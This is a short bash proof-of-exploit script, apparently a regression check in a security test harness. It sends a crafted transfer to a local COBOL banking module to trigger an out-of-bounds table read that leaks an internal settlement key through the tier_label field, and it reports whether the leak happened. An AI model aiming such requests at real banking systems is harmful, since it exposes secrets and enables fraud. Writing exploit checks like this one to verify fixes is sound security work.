#!/usr/bin/env bash
set -euo pipefail
# LG-MEM-001 proof-of-exploit: out-of-bounds read of the COBOL settlement-tier table. Posts a
# transfer with a large amount, which classifies to tier index 4 while the label table OCCURS only 3.
# With extended_tiers=on the index is not clamped, so WS-TIER-LABEL(4) reads the adjacent WS-INTERNAL-ROUTE
# and the internal settlement key leaks into the reply's tier_label. Fires (exit 0) when tier_label is
# that key rather than a real tier name. With the fix the index is clamped and tier_label is TREASURY.
# Hits the COBOL core module directly on its published port. Env: COBOL_URL (default :8082).

COBOL_URL="${COBOL_URL:-http://localhost:8082}"
SECRET="STLMT-KEY-41Z9X!"

resp="$(curl -sS -X POST "$COBOL_URL/post-transfer" -H 'content-type: application/json' -d '{
  "transfer_id":"TMEM0000000000000001","from_account":"000000000042","to_account":"000000000043",
  "amount":"50000.00","currency":"USD","requested_by":"0000000007",
  "requested_at":"2026-01-01T00:00:00Z",
  "actor":{"staff_id":"TLR001","role":"TELLER","branch":"0007"},
  "require_approval_over":"10000.00"}')"

tier="$(python3 -c 'import sys,json
try: print(json.load(sys.stdin).get("tier_label",""))
except Exception: print("")' <<<"$resp")"

if [ "$tier" = "$SECRET" ]; then
  echo "LG-MEM-001 FIRED: OOB read leaked internal key via tier_label -> '$tier'"
  exit 0
fi
echo "LG-MEM-001 not fired: tier_label='$tier' (resp: $(printf '%s' "$resp" | head -c 200))" >&2
exit 1
